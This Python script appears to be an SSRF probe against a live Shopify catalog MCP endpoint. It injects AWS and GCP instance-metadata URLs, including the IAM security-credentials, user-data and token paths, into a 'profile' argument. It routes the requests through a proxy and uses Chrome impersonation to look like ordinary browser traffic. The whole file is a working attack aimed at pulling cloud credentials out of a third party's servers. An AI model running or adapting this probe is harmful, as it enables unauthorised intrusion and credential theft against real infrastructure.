# -*- coding: utf-8 -*-
"""metadata 精确重测:169.254.169.254:443 可达性 + 路径差异 + metadata.google.internal"""
import time
from curl_cffi import requests

PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
}
url = "https://catalog.shopify.com/api/ucp/mcp"

def probe(label, profile):
    body = {
        "jsonrpc": "2.0", "method": "tools/call", "id": 1,
        "params": {"name": "search_catalog", "arguments": {"meta": {"ucp-agent": {"profile": profile}}, "query": "shoes"}},
    }
    t0 = time.time()
    try:
        r = requests.post(url, json=body, headers=H, proxies=PROXY, impersonate="chrome", timeout=25)
        dt = time.time() - t0
        print(f"[{label}] {dt:.1f}s | {r.text[:220]}", flush=True)
    except Exception as e:
        dt = time.time() - t0
        print(f"[{label}] ERROR {dt:.1f}s", flush=True)

if __name__ == "__main__":
    tests = [
        # AWS IMDS 443 探测
        ("aws-443-root", "https://169.254.169.254/"),
        ("aws-443-meta", "https://169.254.169.254/latest/meta-data/"),
        ("aws-443-creds", "https://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("aws-443-creds2", "https://169.254.169.254/latest/meta-data/iam/security-credentials/role"),
        ("aws-443-userdata", "https://169.254.169.254/latest/user-data/"),
        ("aws-443-token", "https://169.254.169.254/latest/api/token"),
        ("aws-443-ident", "https://169.254.169.254/latest/dynamic/instance-identity/document"),
        # GCP metadata
        ("gcp-443-root", "https://metadata.google.internal/"),
        ("gcp-443-v1", "https://metadata.google.internal/computeMetadata/v1/"),
        ("gcp-443-instance", "https://metadata.google.internal/computeMetadata/v1/instance/"),
        ("gcp-443-proj", "https://metadata.google.internal/computeMetadata/v1/project/"),
        ("gcp-443-zone", "https://metadata.google.internal/computeMetadata/v1/instance/zone"),
        # 对照:公网 IP 443 行为
        ("ext-1.1.1.1", "https://1.1.1.1/"),
        ("ext-8.8.8.8", "https://8.8.8.8/"),
    ]
    for label, p in tests:
        probe(label, p)
        time.sleep(0.4)
